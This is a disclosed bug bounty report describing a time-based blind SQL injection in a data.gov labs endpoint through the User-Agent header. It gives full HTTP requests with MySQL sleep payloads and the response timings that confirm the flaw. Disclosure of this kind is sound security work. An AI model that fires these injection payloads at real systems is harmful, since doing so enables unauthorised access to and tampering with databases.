# SQL injection in https://labs.data.gov/dashboard/datagov/csv_to_json via User-agent 

## Report Details
- **Report ID**: 297478
- **URL**: https://hackerone.com/reports/297478
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2017-12-13T11:26:28.370Z
- **Disclosed**: 2019-03-22T16:02:56.793Z

## Reporter
- **Username**: harisec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gsa_bbp

## Vulnerability Information
I've identified an SQL injection vulnerability in the website  **labs.data.gov** that affects the endpoint `/dashboard/datagov/csv_to_json` and can be exploited via the **User-Agent** HTTP header.

I didn't extracted any data from the database, I've confirmed the vulnerability using **sleep** SQL queries with various arithmetic operations. The **sleep** command combined with the arithmetic operations will cause the server to sleep for various amounts of time depending on the result of the arithmetic operation.

For example, setting the value `Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'` to the `User-Agent` header will cause the server to sleep for **25 (5*5)** seconds.

To reproduce, send the following HTTPS request:

```
GET /dashboard/datagov/csv_to_json HTTP/1.1
Referer: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
X-Forwarded-For: 1
X-Requested-With: XMLHttpRequest
Host: labs.data.gov
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*

```

The server will respond after **25 (5*5)** seconds - same as the value of the `User-Agent:` header.

Now, let's cause the server to respond immediately. We will send the value **sleep(5*5*0)** that is equivalent with **0**.

```
GET /dashboard/datagov/csv_to_json HTTP/1.1
Referer: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'
X-Forwarded-For: 1
X-Requested-With: XMLHttpRequest
Host: labs.data.gov
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*

```
The server responded immediately as **5*5*0 = 0**.

Let's confirm it with another request:

```
GET /dashboard/datagov/csv_to_json HTTP/1.1
Referer: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'
X-Forwarded-For: 1
X-Requested-With: XMLHttpRequest
Host: labs.data.gov
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*


```

This time the payload contains **6*6-30** that is equal with **6**. The server responded after **6** seconds.

These are just a few of the SQL queries with various arithmetic operations that I've tried to confirm this issue.

## Impact

An attacker can manipulate the SQL statements that are sent to the MySQL database and inject malicious SQL statements. The attacker is able to change the logic of SQL statements executed against the database.

## Attachments
- sqli-labs-data-gov-ua-25sec.png
- sqli-labs-data-gov-ua-9sec.png
